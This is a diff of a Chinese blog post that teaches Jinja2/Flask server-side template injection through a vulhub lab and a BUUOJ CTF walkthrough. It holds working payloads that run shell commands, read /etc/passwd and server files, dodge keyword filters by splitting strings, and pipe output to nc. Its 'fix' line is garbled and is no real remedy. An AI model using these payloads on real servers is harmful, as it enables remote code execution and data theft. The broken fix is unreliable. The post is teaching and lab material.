@@ -318,64 +318,64 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>ssti 服务端模板注入，多存在于python的jinja2,django,tornado,mako 框架  php的tiwg,smarty框架 java框架jade velocity</p>
+        <h3 id="模板注入">模板注入</h3>
+<p>ssti 服务端模板注入，多存在于python的jinja2,django,tornado,mako 框架
+php的tiwg,smarty框架 java框架jade velocity</p>
 <p>在不正确使用模板引擎进行渲染时，会造成模板注入，会造成RCE，任意文件读取等漏洞，多出现再ctf中.</p>
 <p><img src="/posts/83c81c44/ssti.png"></p>
-<br>
-
+<p><br></p>
 <hr>
-<h3 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h3><ul>
-<li><p><code>__class__</code>         返回该对象所属的类</p>
-<p>   <img src="/posts/83c81c44/1.png"></p>
-</li>
-<li><p><code>__base__</code>        以字符串形式返回一个类所直接继承的第一个类</p>
-</li>
-<li><p><code>__bases__</code>        以元组的形式返回一个类所直接继承的类</p>
-</li>
-<li><p><code>__mro__</code>            返回解析方法调用的顺序</p>
-<p>  <img src="/posts/83c81c44/2.png"></p>
-</li>
-<li><p><code>__subclasses__()</code>        返回这个类的所有子类的集合</p>
-<p>  <img src="/posts/83c81c44/3.png"></p>
-</li>
-<li><p><code>__globals__</code>    <code>function.__global__</code>  获取function所处空间下可以使用的module、方法及所有变量</p>
-</li>
-<li><p><code>__init__</code>        初始化类</p>
-</li>
-<li><p><code>__builtins__</code>     可以利用<code>__import__</code> <code>eval</code>执行命令</p>
-</li>
+<h3 id="知识准备">知识准备</h3>
+<ul>
+<li><p><code>__class__</code> 返回该对象所属的类</p>
+<p><img src="/posts/83c81c44/1.png"></p></li>
+<li><p><code>__base__</code>
+以字符串形式返回一个类所直接继承的第一个类</p></li>
+<li><p><code>__bases__</code>
+以元组的形式返回一个类所直接继承的类</p></li>
+<li><p><code>__mro__</code> 返回解析方法调用的顺序</p>
+<p><img src="/posts/83c81c44/2.png"></p></li>
+<li><p><code>__subclasses__()</code> 返回这个类的所有子类的集合</p>
+<p><img src="/posts/83c81c44/3.png"></p></li>
+<li><p><code>__globals__</code> <code>function.__global__</code>
+获取function所处空间下可以使用的module、方法及所有变量</p></li>
+<li><p><code>__init__</code> 初始化类</p></li>
+<li><p><code>__builtins__</code> 可以利用<code>__import__</code>
+<code>eval</code>执行命令</p></li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>
-<br>
-
-<p><code>&#39;&#39;.__class__.__mro__[-1]</code>为<code>&lt;class &#39;object&#39;&gt;</code></p>
+<p><br></p>
+<p><code>''.__class__.__mro__[-1]</code>为<code>&lt;class 'object'&gt;</code></p>
 <p>python中的类都是继承object的，所以要调用object类的<code>__subclasses__()</code>去得到我们想要使用的类的对象，</p>
-<br>
-
+<p><br></p>
 <p>利用ssti要做的主要为两点</p>
 <ul>
 <li>读取文件内容</li>
 <li>执行命令</li>
 </ul>
 <p>那只需要去寻找 os/file等关键字</p>
-<p>一般都是使用object类下的 <code>&lt;class &#39;os._wrap_close&#39;&gt;</code>的<code>popen</code></p>
+<p>一般都是使用object类下的
+<code>&lt;class 'os._wrap_close'&gt;</code>的<code>popen</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[:<span class="number">200</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
-
 <hr>
-<h3 id="vulhub上的flask-ssti"><a href="#vulhub上的flask-ssti" class="headerlink" title="vulhub上的flask ssti"></a>vulhub上的flask ssti</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
-
-<h4 id="关键语句"><a href="#关键语句" class="headerlink" title="关键语句"></a>关键语句</h4><p><code>t = Template(&quot;Hello &quot; + name)</code></p>
+<h3 id="vulhub上的flask-ssti">vulhub上的flask ssti</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<h4 id="关键语句">关键语句</h4>
+<p><code>t = Template("Hello " + name)</code></p>
 <p>利用get传参进入template，构造注入语句</p>
-<h4 id="验证语句"><a href="#验证语句" class="headerlink" title="验证语句"></a>验证语句</h4><p><img src="/posts/83c81c44/ssti1.png"></p>
+<h4 id="验证语句">验证语句</h4>
+<p><img src="/posts/83c81c44/ssti1.png"></p>
 <p><img src="/posts/83c81c44/ssti2.png"></p>
 <p><img src="/posts/83c81c44/ssti3.png"></p>
-<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><code>t = Template(&quot;Hello &quot; + &#123;&#123;defense&#125;&#125;)</code></p>
-<h4 id="官方POC"><a href="#官方POC" class="headerlink" title="官方POC"></a>官方POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data) </code></p>
+<h4 id="漏洞修复">漏洞修复</h4>
+<p><code>t = Template("Hello " + &#123;&#123;defense&#125;&#125;)</code></p>
+<h4 id="官方poc">官方POC</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><code>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
 <hr>
-<h3 id="buuoj-ssti"><a href="#buuoj-ssti" class="headerlink" title="buuoj ssti"></a>buuoj ssti</h3><p><img src="/posts/83c81c44/buuoj1.png"></p>
-<p>可以判断是flask jinja2 的模板    (如果返回的是25 则是Twig模板)</p>
+<h3 id="buuoj-ssti">buuoj ssti</h3>
+<p><img src="/posts/83c81c44/buuoj1.png"></p>
+<p>可以判断是flask jinja2 的模板 (如果返回的是25 则是Twig模板)</p>
 <p><img src="/posts/83c81c44/buuoj2.png"></p>
 <p><img src="/posts/83c81c44/buuoj3.png"></p>
 <p><code>?password=&#123;&#123;%27%27.__class__.__base__&#125;&#125;</code></p>
@@ -404,23 +404,23 @@
 <p>看看server.py</p>
 <p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27cat%20/app/server.py%27).read()&#125;&#125;</code></p>
 <p><img src="/posts/83c81c44/buuoj12.png"></p>
-<p>得到flag <code>n1book&#123;eddb84d69a421a82&#125; </code></p>
-<br>
-
+<p>得到flag <code>n1book&#123;eddb84d69a421a82&#125;</code></p>
+<p><br></p>
 <hr>
-<h3 id="可能会用到的payload"><a href="#可能会用到的payload" class="headerlink" title="可能会用到的payload"></a>可能会用到的payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /app&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__imp&#x27;+&#x27;ort__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ls ./&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls | nc 127.0.0.1 1234&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__&#x27;+&#x27;glo&#x27;+&#x27;bal&#x27;+&#x27;s__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#x27;+&#x27;ad()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 如果过滤了[]等括号  </p>
-<p>  使用 <code>__gititem__</code></p>
-<p><code>&#123;&#123;%27%27.__class__.__bases__[0]&#125;&#125; </code>       –&gt;      <code> &#123;&#123;%27%27.__class__.__bases__.__getitem__(0)&#125;&#125;</code></p>
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/114373785">https://blog.csdn.net/weixin_45669205/article/details/114373785</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/">http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xy--1/p/12841941.html</a></p>
-<p><a target="_blank" rel="noopener" href="http://ctf.ieki.xyz/library/ssti.html">http://ctf.ieki.xyz/library/ssti.html</a></p>
+<h3 id="可能会用到的payload">可能会用到的payload</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /app&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__imp&#x27;+&#x27;ort__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ls ./&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls | nc 127.0.0.1 1234&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__&#x27;+&#x27;glo&#x27;+&#x27;bal&#x27;+&#x27;s__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#x27;+&#x27;ad()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>如果过滤了[]等括号</p>
+<p>使用 <code>__gititem__</code></p>
+<p><code>&#123;&#123;%27%27.__class__.__bases__[0]&#125;&#125;</code> --&gt;
+<code>&#123;&#123;%27%27.__class__.__bases__.__getitem__(0)&#125;&#125;</code></p>
+<p><br></p>
+<h3 id="reference">Reference</h3>
+<blockquote>
+<p>https://blog.csdn.net/weixin_45669205/article/details/114373785</p>
+<p>https://xz.aliyun.com/t/3679</p>
+<p>http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/</p>
+<p>https://www.cnblogs.com/Xy--1/p/12841941.html</p>
+<p>http://ctf.ieki.xyz/library/ssti.html</p>
 </blockquote>
 
     </div>
@@ -551,7 +551,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">模板注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">知识准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vulhub%E4%B8%8A%E7%9A%84flask-ssti"><span class="nav-number">3.</span> <span class="nav-text">vulhub上的flask ssti</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.1.</span> <span class="nav-text">关键语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.2.</span> <span class="nav-text">验证语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%98%E6%96%B9POC"><span class="nav-number">3.4.</span> <span class="nav-text">官方POC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#buuoj-ssti"><span class="nav-number">4.</span> <span class="nav-text">buuoj ssti</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84payload"><span class="nav-number">5.</span> <span class="nav-text">可能会用到的payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">6.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">模板注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">知识准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vulhub%E4%B8%8A%E7%9A%84flask-ssti"><span class="nav-number">3.</span> <span class="nav-text">vulhub上的flask ssti</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.1.</span> <span class="nav-text">关键语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.2.</span> <span class="nav-text">验证语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%98%E6%96%B9poc"><span class="nav-number">3.4.</span> <span class="nav-text">官方POC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#buuoj-ssti"><span class="nav-number">4.</span> <span class="nav-text">buuoj ssti</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84payload"><span class="nav-number">5.</span> <span class="nav-text">可能会用到的payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">6.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -567,7 +567,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -615,7 +615,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -629,7 +629,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -640,7 +640,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -780,6 +780,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
